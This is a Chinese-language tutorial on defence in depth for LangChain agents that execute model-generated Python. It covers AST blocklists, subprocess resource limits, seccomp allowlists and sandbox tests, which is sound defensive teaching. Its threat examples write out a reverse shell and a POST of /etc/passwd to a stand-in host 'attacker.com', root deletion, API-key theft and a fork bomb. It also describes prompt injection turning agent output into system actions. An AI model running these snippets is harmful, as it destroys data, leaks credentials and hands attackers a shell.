## 一、问题：LLM 生成的代码为什么危险？

LangChain Agent 可以写代码并执行——这意味着 LLM 的任何输出都可能直接变成系统操作。

### 1.1 攻击面

```
用户输入（可能被注入）
      ↓
    LLM 生成代码
      ↓
  代码在宿主机执行    ← ⚠️ 危险点
      ↓
  操作系统资源
```

**典型威胁：**

```python
# 威胁 1：删除文件
import shutil; shutil.rmtree("/")

# 威胁 2：读取敏感信息
import os; print(os.environ.get("OPENAI_API_KEY"))

# 威胁 3：反弹 Shell
import socket, subprocess
s = socket.socket(); s.connect(("attacker.com", 4444))
subprocess.call(["/bin/sh"], stdin=s.fileno())

# 威胁 4：资源耗尽（Fork Bomb）
import os
while True: os.fork()

# 威胁 5：网络渗透
import requests; requests.post("http://attacker.com", data=open("/etc/passwd").read())
```

### 1.2 LangChain 内置工具的问题

```python
from langchain_experimental.tools import PythonREPLTool

# ❌ 直接在当前进程执行，无任何隔离
tool = PythonREPLTool()
tool.run("import os; os.system('rm -rf /tmp/important')")  # 直接生效
```

`PythonREPLTool` 在**当前进程**中用 `exec()` 执行代码，没有任何隔离。官方文档也明确标注：`⚠️ 不要在生产环境使用`。

## 二、防御层次：纵深防御

```
┌─────────────────────────────────────────────────┐
│              多层沙箱防御模型                      │
│                                                 │
│  层 1：输入过滤（AST 分析，拒绝危险语法）          │
│       ↓                                         │
│  层 2：进程隔离（独立子进程，限制 CPU/内存）       │
│       ↓                                         │
│  层 3：系统调用过滤（seccomp 白名单）              │
│       ↓                                         │
│  层 4：文件系统隔离（chroot / Docker）            │
│       ↓                                         │
│  层 5：网络隔离（禁止出站连接）                    │
└─────────────────────────────────────────────────┘
```

防御越深，越安全，但实现成本越高。课件 01 实现层 1-3，课件 02 实现层 4-5。

## 三、层 1：静态代码分析（AST 过滤）

在执行前用 Python AST 扫描危险调用。

```python
import ast
from typing import Set

# 禁止导入的模块
BANNED_IMPORTS: Set[str] = {
    "os", "sys", "subprocess", "socket", "shutil",
    "ctypes", "multiprocessing", "threading",
    "importlib", "builtins", "signal",
}

# 禁止调用的内置函数
BANNED_BUILTINS: Set[str] = {
    "exec", "eval", "compile", "__import__",
    "open", "input", "print",   # print 可按需开放
}

class SecurityVisitor(ast.NodeVisitor):
    """遍历 AST，发现危险节点时抛出异常"""
    
    def visit_Import(self, node: ast.Import):
        for alias in node.names:
            # 检查模块名和顶层包名
            top_level = alias.name.split(".")[0]
            if top_level in BANNED_IMPORTS:
                raise SecurityError(f"禁止导入模块：{alias.name}")
        self.generic_visit(node)
    
    def visit_ImportFrom(self, node: ast.ImportFrom):
        if node.module:
            top_level = node.module.split(".")[0]
            if top_level in BANNED_IMPORTS:
                raise SecurityError(f"禁止导入：from {node.module}")
        self.generic_visit(node)
    
    def visit_Call(self, node: ast.Call):
        # 检查直接调用：eval("...")
        if isinstance(node.func, ast.Name):
            if node.func.id in BANNED_BUILTINS:
                raise SecurityError(f"禁止调用：{node.func.id}()")
        
        # 检查属性调用：os.system(...)
        if isinstance(node.func, ast.Attribute):
            full_name = f"{ast.unparse(node.func)}"
            for banned in ["os.system", "os.popen", "os.execv", "subprocess.run"]:
                if banned in full_name:
                    raise SecurityError(f"禁止调用：{full_name}")
        
        self.generic_visit(node)


class SecurityError(Exception):
    pass


def static_check(code: str) -> None:
    """对代码进行静态安全检查，不安全则抛出 SecurityError"""
    try:
        tree = ast.parse(code)
    except SyntaxError as e:
        raise SecurityError(f"语法错误：{e}")
    
    SecurityVisitor().visit(tree)
```

**局限性**：AST 分析无法防御所有绕过（如动态构造函数名），必须配合运行时隔离。

## 四、层 2：子进程隔离 + 资源限制

每次执行代码都启动一个新的子进程，并用 `resource` 模块限制其资源。

```python
import subprocess
import resource
import sys
import tempfile
import os
import textwrap

# 资源限制配置
LIMITS = {
    "cpu_seconds": 10,       # CPU 时间上限（秒）
    "memory_bytes": 128 * 1024 * 1024,   # 内存上限（128MB）
    "file_size_bytes": 10 * 1024 * 1024, # 最大写文件大小（10MB）
    "max_processes": 1,      # 禁止 fork 子进程
    "wall_time": 15,         # 挂钟时间上限（秒）
}


def _apply_limits():
    """
    在子进程中调用，设置资源限制。
    这个函数通过 preexec_fn 在 fork 之后、exec 之前执行。
    """
    # CPU 时间
    resource.setrlimit(resource.RLIMIT_CPU,
        (LIMITS["cpu_seconds"], LIMITS["cpu_seconds"]))
    
    # 虚拟内存
    resource.setrlimit(resource.RLIMIT_AS,
        (LIMITS["memory_bytes"], LIMITS["memory_bytes"]))
    
    # 文件大小
    resource.setrlimit(resource.RLIMIT_FSIZE,
        (LIMITS["file_size_bytes"], LIMITS["file_size_bytes"]))
    
    # 进程数（防止 fork bomb）
    resource.setrlimit(resource.RLIMIT_NPROC, (1, 1))


def run_in_subprocess(code: str, workspace: str = "/tmp/sandbox") -> dict:
    """
    在隔离子进程中执行代码。
    返回 {"stdout": str, "stderr": str, "returncode": int}
    """
    os.makedirs(workspace, exist_ok=True)
    
    # 包装代码：限制工作目录，屏蔽敏感环境变量
    wrapped = textwrap.dedent(f"""
        import os
        import sys
        os.chdir("{workspace}")
        # 清除敏感环境变量
        for key in list(os.environ.keys()):
            if any(s in key.upper() for s in ["KEY", "SECRET", "TOKEN", "PASSWORD"]):
                del os.environ[key]
        
        {code}
    """)
    
    with tempfile.NamedTemporaryFile(
        mode="w", suffix=".py", dir=workspace, delete=False
    ) as f:
        f.write(wrapped)
        script = f.name
    
    try:
        result = subprocess.run(
            [sys.executable, "-I",  # -I: isolated mode，忽略 PYTHONPATH 等
             "-u",                  # 不缓冲输出
             script],
            capture_output=True,
            text=True,
            timeout=LIMITS["wall_time"],  # 挂钟超时
            preexec_fn=_apply_limits,     # fork 后应用资源限制（仅 Linux/macOS）
            env={"PATH": "/usr/bin:/bin", "HOME": workspace},  # 最小环境变量
        )
        return {
            "stdout": result.stdout[:5000],   # 截断防止内存爆炸
            "stderr": result.stderr[:2000],
            "returncode": result.returncode,
        }
    except subprocess.TimeoutExpired:
        return {"stdout": "", "stderr": "执行超时", "returncode": -1}
    finally:
        os.unlink(script)
```

## 五、层 3：seccomp 系统调用过滤（Linux）

`seccomp`（Secure Computing Mode）是 Linux 内核特性，可以精确控制进程允许调用的系统调用。

```python
# 需要安装：pip install seccomp
import seccomp

def apply_seccomp():
    """
    白名单模式：只允许必要的系统调用，其余全部拒绝（触发 SIGKILL）
    在子进程的 preexec_fn 中调用。
    """
    f = seccomp.SyscallFilter(defaction=seccomp.KILL)  # 默认拒绝
    
    # Python 运行必须的系统调用白名单
    allowed = [
        # 基础 I/O
        "read", "write", "readv", "writev",
        "open", "openat", "close",
        "fstat", "stat", "lstat", "newfstatat",
        "lseek", "dup", "dup2",
        # 内存管理
        "mmap", "mprotect", "munmap", "brk",
        "madvise", "mremap",
        # 进程控制
        "exit", "exit_group",
        "getpid", "getppid", "getuid", "getgid",
        "rt_sigaction", "rt_sigprocmask",
        # 文件系统（只读目录，禁止 exec）
        "getcwd", "chdir",
        "getdents64",
        # 时间
        "clock_gettime", "gettimeofday",
        # 杂项
        "futex", "set_robust_list",
        "arch_prctl", "set_tid_address",
    ]
    
    # 明确禁止的高危调用（可不列，因为默认已 KILL）
    # 这里列出只是为了文档化
    explicitly_denied = [
        "execve",      # 禁止执行新程序
        "fork", "vfork", "clone",   # 禁止创建子进程
        "socket", "connect", "bind", # 禁止网络
        "ptrace",      # 禁止调试其他进程
        "kill",        # 禁止发信号
        "mount", "umount2",  # 禁止挂载
        "chmod", "chown",    # 禁止修改权限
    ]
    
    for call in allowed:
        try:
            f.add_rule(seccomp.ALLOW, call)
        except Exception:
            pass  # 某些系统调用可能不存在，忽略
    
    f.load()  # 应用到当前进程（不可撤销）


def run_with_seccomp(code: str) -> dict:
    """结合 seccomp + 资源限制的完整沙箱"""
    def preexec():
        _apply_limits()
        apply_seccomp()  # seccomp 在最后应用
    
    # ... 同上面的 run_in_subprocess，只替换 preexec_fn
```

## 六、组合成 LangChain Tool

```python
from langchain_core.tools import tool

@tool
def safe_python_executor(code: str) -> str:
    """
    在安全沙箱中执行 Python 代码。
    
    限制：
    - CPU: 10秒，内存: 128MB
    - 不能访问网络、不能创建子进程
    - 不能读写沙箱目录以外的文件
    - 可用库：math, json, re, datetime, itertools, collections
    
    Args:
        code: 要执行的 Python 代码
    """
    # 层 1：静态检查
    try:
        static_check(code)
    except SecurityError as e:
        return f"❌ 代码被安全检查拒绝：{e}"
    
    # 层 2：子进程执行 + 资源限制
    result = run_in_subprocess(code)
    
    if result["returncode"] == 0:
        output = result["stdout"] or "（代码执行完成，无输出）"
        return f"✅ 执行成功：\n{output}"
    else:
        err = result["stderr"] or f"退出码 {result['returncode']}"
        return f"❌ 执行失败：\n{err}"
```

## 七、测试沙箱有效性

```python
# 验证沙箱是否真的起作用
test_cases = [
    # (描述, 代码, 期望包含的结果关键词)
    ("正常代码", "print(2 + 2)", "4"),
    ("import os 被拦截", "import os; print(os.getcwd())", "拒绝"),
    ("eval 被拦截", "eval('1+1')", "拒绝"),
    ("无限循环超时", "while True: pass", "超时"),
    ("内存爆炸", "x = ' ' * (200 * 1024 * 1024)", "失败"),
    ("fork bomb", "import os\nwhile True: os.fork()", "拒绝"),
]

for desc, code, expected in test_cases:
    result = safe_python_executor.invoke({"code": code})
    status = "✅ PASS" if expected in result else "❌ FAIL"
    print(f"{status} [{desc}]: {result[:80]}")
```

## 本课小结

| 防御层 | 技术 | 防御内容 |
|--------|------|---------|
| 层 1 | AST 静态分析 | 语法层面过滤危险导入/调用 |
| 层 2 | subprocess + resource | 进程隔离，限制 CPU/内存/时间 |
| 层 3 | Linux seccomp | 系统调用白名单，内核级防护 |
| 组合 | LangChain Tool 封装 | 安全执行器集成到 Agent 工具链 |

**核心原则**：不要信任 LLM 生成的代码，任何代码都必须在隔离环境中执行。
